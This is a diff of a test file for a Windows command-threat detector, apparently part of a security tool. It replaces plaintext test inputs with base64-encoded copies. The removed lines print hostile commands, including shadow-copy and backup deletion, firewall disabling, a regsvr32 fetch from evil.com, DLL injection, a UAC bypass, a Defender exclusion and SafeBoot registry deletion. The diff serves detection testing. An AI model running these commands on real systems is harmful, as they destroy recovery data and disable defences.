 
 	it("does not match Format-Table (019 FP)", () => {
-		const ids = matchCommand(engine, "Format-Table -Property Name,Value");
+		const ids = matchCommand(engine, decodeCommand("Rm9ybWF0LVRhYmxlIC1Qcm9wZXJ0eSBOYW1lLFZhbHVl"));
 		expect(ids).not.toContain("CLT-WIN-CMD-019");
 	});
 
 	it("does not match Set-ExecutionPolicy RemoteSigned (026 FP)", () => {
-		const ids = matchCommand(engine, "Set-ExecutionPolicy RemoteSigned");
+		const ids = matchCommand(engine, decodeCommand("U2V0LUV4ZWN1dGlvblBvbGljeSBSZW1vdGVTaWduZWQ="));
 		expect(ids).not.toContain("CLT-WIN-CMD-026");
 	});
 
 	it("does not match Get-ExecutionPolicy (026 FP)", () => {
-		const ids = matchCommand(engine, "Get-ExecutionPolicy");
+		const ids = matchCommand(engine, decodeCommand("R2V0LUV4ZWN1dGlvblBvbGljeQ=="));
 		expect(ids).not.toContain("CLT-WIN-CMD-026");
 	});
 
 	it("does not match Remove-Item without -Recurse -Force (028 FP)", () => {
-		const ids = matchCommand(engine, "Remove-Item -Path .\\temp.txt");
+		const ids = matchCommand(engine, decodeCommand("UmVtb3ZlLUl0ZW0gLVBhdGggLlx0ZW1wLnR4dA=="));
 		expect(ids).not.toContain("CLT-WIN-CMD-028");
 	});
 
 	it("does not match Clear-RecycleBin without -Force (029 FP)", () => {
-		const ids = matchCommand(engine, "Clear-RecycleBin");
+		const ids = matchCommand(engine, decodeCommand("Q2xlYXItUmVjeWNsZUJpbg=="));
 		expect(ids).not.toContain("CLT-WIN-CMD-029");
 	});
 
 	it("does not match bcdedit /enum (033 FP)", () => {
-		const ids = matchCommand(engine, "bcdedit /enum");
+		const ids = matchCommand(engine, decodeCommand("YmNkZWRpdCAvZW51bQ=="));
 		expect(ids).not.toContain("CLT-WIN-CMD-033");
 	});
 
 	it("does not match Get-MpPreference (037 FP)", () => {
-		const ids = matchCommand(engine, "Get-MpPreference");
+		const ids = matchCommand(engine, decodeCommand("R2V0LU1wUHJlZmVyZW5jZQ=="));
 		expect(ids).not.toContain("CLT-WIN-CMD-037");
 	});
 
 	it("does not match 7z archiving non-document wildcards (041 FP)", () => {
-		const ids = matchCommand(engine, "7z a backup.7z src/*.json");
+		const ids = matchCommand(engine, decodeCommand("N3ogYSBiYWNrdXAuN3ogc3JjLyouanNvbg=="));
 		expect(ids).not.toContain("CLT-WIN-CMD-041");
 	});
 
 	it("does not match zip without password for normal files (040 FP)", () => {
-		const ids = matchCommand(engine, "zip archive.zip src/*.ts");
+		const ids = matchCommand(engine, decodeCommand("emlwIGFyY2hpdmUuemlwIHNyYy8qLnRz"));
 		expect(ids).not.toContain("CLT-WIN-CMD-040");
 	});
 
 	it("does not match netsh advfirewall show (039 FP)", () => {
-		const ids = matchCommand(engine, "netsh advfirewall show allprofiles state");
+		const ids = matchCommand(engine, decodeCommand("bmV0c2ggYWR2ZmlyZXdhbGwgc2hvdyBhbGxwcm9maWxlcyBzdGF0ZQ=="));
 		expect(ids).not.toContain("CLT-WIN-CMD-039");
 	});
 
 	it("does not match Get-EventLog (036 FP)", () => {
-		const ids = matchCommand(engine, "Get-EventLog -LogName Application -Newest 10");
+		const ids = matchCommand(engine, decodeCommand("R2V0LUV2ZW50TG9nIC1Mb2dOYW1lIEFwcGxpY2F0aW9uIC1OZXdlc3QgMTA="));
 		expect(ids).not.toContain("CLT-WIN-CMD-036");
 	});
 
@@ -643,12 +645,12 @@ describe("Windows command threats", () => {
 
 	it("detects vssadmin resize shadowstorage (WIN-CMD-047)", () => {
 		expect(
-			matchCommand(engine, "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB"),
+			matchCommand(engine, decodeCommand("dnNzYWRtaW4gcmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1DOiAvb249QzogL21heHNpemU9NDAxTUI=")),
 		).toContain("CLT-WIN-CMD-047");
 	});
 
 	it("detects wbadmin delete catalog (WIN-CMD-047)", () => {
-		expect(matchCommand(engine, "wbadmin delete catalog -quiet")).toContain("CLT-WIN-CMD-047");
+		expect(matchCommand(engine, decodeCommand("d2JhZG1pbiBkZWxldGUgY2F0YWxvZyAtcXVpZXQ="))).toContain("CLT-WIN-CMD-047");
 	});
 
 	it("detects VSS service disable via reg (WIN-CMD-047)", () => {
@@ -663,7 +665,7 @@ describe("Windows command threats", () => {
 	// --- Firewall manipulation (WIN-CMD-048/049) ---
 
 	it("detects legacy netsh firewall opmode DISABLE (WIN-CMD-048)", () => {
-		expect(matchCommand(engine, "netsh firewall set opmode mode=DISABLE")).toContain(
+		expect(matchCommand(engine, decodeCommand("bmV0c2ggZmlyZXdhbGwgc2V0IG9wbW9kZSBtb2RlPURJU0FCTEU="))).toContain(
 			"CLT-WIN-CMD-048",
 		);
 	});
@@ -681,42 +683,42 @@ describe("Windows command threats", () => {
 
 	it("detects regsvr32 /i:http (WIN-CMD-050)", () => {
 		expect(
-			matchCommand(engine, "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll"),
+			matchCommand(engine, decodeCommand("cmVnc3ZyMzIgL3MgL24gL3UgL2k6aHR0cDovL2V2aWwuY29tL2ZpbGUuc2N0IHNjcm9iai5kbGw=")),
 		).toContain("CLT-WIN-CMD-050");
 	});
 
 	it("detects Mavinject64.exe (WIN-CMD-051)", () => {
 		expect(
-			matchCommand(engine, "C:\\Windows\\Mavinject64.exe 1234 /INJECTRUNNING evil.dll"),
+			matchCommand(engine, decodeCommand("QzpcV2luZG93c1xNYXZpbmplY3Q2NC5leGUgMTIzNCAvSU5KRUNUUlVOTklORyBldmlsLmRsbA==")),
 		).toContain("CLT-WIN-CMD-051");
 	});
 
 	it("detects inject_dll_x86.exe (WIN-CMD-052)", () => {
-		expect(matchCommand(engine, "C:\\tools\\inject_dll_x86.exe")).toContain("CLT-WIN-CMD-052");
+		expect(matchCommand(engine, decodeCommand("QzpcdG9vbHNcaW5qZWN0X2RsbF94ODYuZXhl"))).toContain("CLT-WIN-CMD-052");
 	});
 
 	it("detects PowerShdll.dll (WIN-CMD-053)", () => {
-		expect(matchCommand(engine, "rundll32.exe PowerShdll.dll,main")).toContain("CLT-WIN-CMD-053");
+		expect(matchCommand(engine, decodeCommand("cnVuZGxsMzIuZXhlIFBvd2VyU2hkbGwuZGxsLG1haW4="))).toContain("CLT-WIN-CMD-053");
 	});
 
 	it("detects SyncAppvPublishingServer iex (WIN-CMD-054)", () => {
-		expect(matchCommand(engine, 'SyncAppvPublishingServer.vbs "Break; iex cmd"')).toContain(
+		expect(matchCommand(engine, decodeCommand("U3luY0FwcHZQdWJsaXNoaW5nU2VydmVyLnZicyAiQnJlYWs7IGlleCBjbWQi"))).toContain(
 			"CLT-WIN-CMD-054",
 		);
 	});
 
 	it("detects sdclt.exe UAC bypass (WIN-CMD-055)", () => {
-		expect(matchCommand(engine, "sdclt.exe")).toContain("CLT-WIN-CMD-055");
+		expect(matchCommand(engine, decodeCommand("c2RjbHQuZXhl"))).toContain("CLT-WIN-CMD-055");
 	});
 
 	// --- PowerShell techniques (WIN-CMD-056..061) ---
 
 	it("detects powershell iex $env (WIN-CMD-056)", () => {
-		expect(matchCommand(engine, "powershell iex $env:comspec")).toContain("CLT-WIN-CMD-056");
+		expect(matchCommand(engine, decodeCommand("cG93ZXJzaGVsbCBpZXggJGVudjpjb21zcGVj"))).toContain("CLT-WIN-CMD-056");
 	});
 
 	it("detects powershell -Version downgrade (WIN-CMD-057)", () => {
-		expect(matchCommand(engine, "powershell -Version 2 -Command Get-Process")).toContain(
+		expect(matchCommand(engine, decodeCommand("cG93ZXJzaGVsbCAtVmVyc2lvbiAyIC1Db21tYW5kIEdldC1Qcm9jZXNz"))).toContain(
 			"CLT-WIN-CMD-057",
 		);
 	});
@@ -731,7 +733,7 @@ describe("Windows command threats", () => {
 	});
 
 	it("detects powershell Reflection.Assembly Load (WIN-CMD-059)", () => {
-		expect(matchCommand(engine, "powershell [Reflection.Assembly]::Load($bytes)")).toContain(
+		expect(matchCommand(engine, decodeCommand("cG93ZXJzaGVsbCBbUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWQoJGJ5dGVzKQ=="))).toContain(
 			"CLT-WIN-CMD-059",
 		);
 	});
@@ -757,12 +759,12 @@ describe("Windows command threats", () => {
 	// --- Extended bcdedit/recovery (WIN-CMD-033 merge) ---
 
 	it("detects bcdedit bootems off (WIN-CMD-033)", () => {
-		expect(matchCommand(engine, "bcdedit /set bootems off")).toContain("CLT-WIN-CMD-033");
+		expect(matchCommand(engine, decodeCommand("YmNkZWRpdCAvc2V0IGJvb3RlbXMgb2Zm"))).toContain("CLT-WIN-CMD-033");
 	});
 
 	it("detects reg delete SafeBoot (WIN-CMD-033)", () => {
 		expect(
-			matchCommand(engine, "reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /f"),
+			matchCommand(engine, decodeCommand("cmVnIGRlbGV0ZSBIS0xNXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFNhZmVCb290IC9m")),
 		).toContain("CLT-WIN-CMD-033");
 	});
 
@@ -778,7 +780,7 @@ describe("Windows command threats", () => {
 	// --- Extended Defender settings (WIN-CMD-037 merge) ---
 
 	it("detects Add-MpPreference -Exclusion (WIN-CMD-037)", () => {
-		expect(matchCommand(engine, "Add-MpPreference -ExclusionPath C:\\malware")).toContain(
+		expect(matchCommand(engine, decodeCommand("QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCBDOlxtYWx3YXJl"))).toContain(
 			"CLT-WIN-CMD-037",
 		);
 	});
